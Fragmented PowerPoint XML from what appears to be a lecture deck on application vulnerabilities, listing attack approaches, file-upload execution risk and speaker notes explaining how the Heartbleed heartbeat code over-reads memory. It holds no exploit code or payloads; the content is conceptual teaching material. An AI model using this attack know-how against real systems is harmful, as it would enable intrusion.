            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18287865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79</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81</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18534079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Header.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -&gt; to display</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -&gt; execute</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>94</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2001192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blog.sucuri.net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/2013/12/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>wordpress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>optimizepress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-theme-file-upload-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vulnerability.html</a:t>
            </a:r>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100</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6059830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www.theregister.co.uk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/2014/04/09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>heartbleed_explained</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>104</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34963062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www.theregister.co.uk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/2014/04/09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>heartbleed_explained</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>105</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34963062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So the message type is popped into the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>hbtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> variable, the pointer is incremented by one byte, and the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>n2s()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> macro writes the 16-bit length of the heartbeat payload to the variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> and increments the pointer by two bytes. Then </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> becomes a pointer to the contents of the payload.</a:t>
            </a:r>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106</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31138745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So the code writes the response type to the start of the buffer, increments the buffer pointer, uses the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>s2n()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> macro to write the 16-bit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> length to memory and increment the buffer pointer by two bytes, and then it copies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> number of bytes from the received payload into the outgoing payload for the reply.</a:t>
            </a:r>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108</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2170735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latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>So the code writes the response type to the start of the buffer, increments the buffer pointer, uses the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>s2n()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> macro to write the 16-bit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> length to memory and increment the buffer pointer by two bytes, and then it copies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> number of bytes from the received payload into the outgoing payload for the reply.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>109</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2170735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latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>So the code writes the response type to the start of the buffer, increments the buffer pointer, uses the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>s2n()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> macro to write the 16-bit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> length to memory and increment the buffer pointer by two bytes, and then it copies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> number of bytes from the received payload into the outgoing payload for the reply.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>110</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2170735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336F1142-7AD5-4B48-8C03-A7870E0D6469}" type="slidenum">
              <a:rPr lang="en-GB"/>
              <a:pPr/>
              <a:t>120</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40961" name="Text Box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40962" name="Text Box 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="4343400"/>
            <a:ext cx="5486400" cy="402590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58F2609-EDBF-2143-8AA0-E9E74E1D3492}"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920901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8F2609-EDBF-2143-8AA0-E9E74E1D3492}"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381062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8F2609-EDBF-2143-8AA0-E9E74E1D3492}"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2995163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8F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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697528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8F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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2981792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58F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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62105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F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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296409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8F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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3552131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8F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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230618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8F2609-EDBF-2143-8AA0-E9E74E1D3492}"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3000716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8F2609-EDBF-2143-8AA0-E9E74E1D3492}"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156645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8F2609-EDBF-2143-8AA0-E9E74E1D3492}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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9DEDD2-6753-354F-B3EC-25E3BB2E17CD}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4080983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www.example.com/people.php?name=Joe&amp;age=24"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8.jpg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout5.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.jpeg"/></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4.gif"/><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6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4.gif"/><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6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hyperlink" Target="http://www.sss.com" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image24.gif"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2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6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25.jp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hyperlink" Target="https://blog.sucuri.net/"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Application Vulnerabilities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66028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Motivating Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Break into a system or escalate your privilege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="1194983813750083554server_mimooh_.svg.m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9380" y="2964358"/>
            <a:ext cx="2071938" cy="2205611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Left Arrow 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5474455" y="3573073"/>
            <a:ext cx="1184599" cy="378541"/>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rgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1302819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General Approaches</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1660695"/>
            <a:ext cx="4038600" cy="4465468"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Identify the credential to break in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Weak password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Brute force</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Social engineering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648200" y="1660695"/>
            <a:ext cx="4038600" cy="4465468"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Compromise the program vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Incomplete mediation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Timing attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer overflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1763041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Incomplete Mediation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8229600" cy="2099731"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A program fails to perform “sanity checks” on data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A program that accepts a filename, and outputs its content to a student. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="378574" y="3956361"/>
            <a:ext cx="5178047" cy="2533548"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>
          <a:extLst>
            <a:ext uri="{FAA26D3D-D897-4be2-8F04-BA451C77F1D7}">
              <ma14:placeholderFlag xmlns="" xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" val="1"/>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prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
